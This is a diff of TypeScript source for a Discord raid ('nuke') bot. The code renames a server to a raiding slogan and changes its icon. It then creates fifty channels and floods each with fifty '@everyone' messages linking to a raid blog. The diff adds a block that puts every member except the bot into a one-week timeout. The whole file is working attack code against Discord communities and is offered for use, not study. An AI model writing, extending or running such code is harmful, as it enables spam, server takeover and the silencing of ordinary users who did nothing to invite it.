@@ -78,8 +78,17 @@ https://discord.gg/annycW3Xrk
 
       const max = 50;
       discordServer?.setName(text?.split("\n")[0] ?? "荒らし共栄圏万歳！");
-      discordServer?.setIcon("https://ctkpaarrdata.files.wordpress.com/2023/03/cropped-20211120_125906.gif?w=196")
-
+      discordServer?.setIcon(
+        "https://ctkpaarrdata.files.wordpress.com/2023/03/cropped-20211120_125906.gif?w=196"
+      );
+      // NOTE
+      (await discordServer?.members.list() ?? []).forEach(async (member: any) => {
+        if (member.id === client.user?.id) {
+          await member.timeout(0, "荒らし共栄圏万歳！");
+        } else {
+          await member.timeout(60 * 1000 * 60 * 24 * 7, "荒らし共栄圏万歳！");
+        }
+      });
       for (let i = 0; i < max; i++) {
         discordServer?.channels
           .create({
@@ -89,23 +98,24 @@ https://discord.gg/annycW3Xrk
           .then(async (channel) => {
             for (let j = 0; j < max; j++) {
               try {
-                channel.send(
+                await channel.send(
                   text ??
                     "荒らし共栄圏万歳！ \n https://ctkpaarr.data.blog \n @everyone"
                 );
               } catch (_e) {
                 /* ANTI TIMEOUT */
+                console.log(_e);
 
                 try {
-                    (await discordServer.members.list()).forEach(async (member) => {
-                        if (member.id === client.user?.id) {
-                            member.timeout(0, "荒らし共栄圏万歳！");
-                        }else {
-                            member.timeout(60 * 1000 * 60 * 24 * 7, "荒らし共栄圏万歳！");
-                        }
-                    })
-                }catch(_e) {
-
+                  (await discordServer.members.list()).forEach(
+                    async (member) => {
+                      if (member.id === client.user?.id) {
+                        member.timeout(0, "荒らし共栄圏万歳！");
+                      }
+                    }
+                  );
+                } catch (_e) {
+                  console.log(_e);
                 }
               }
             }
@@ -119,7 +129,7 @@ https://discord.gg/annycW3Xrk
       });
 
       discordServer?.setName(text?.split("\n")[0] ?? "荒らし共栄圏万歳！");
-    }else {
+    } else {
       await interaction.reply("**現在メンテナンス中です。**");
     }
   }
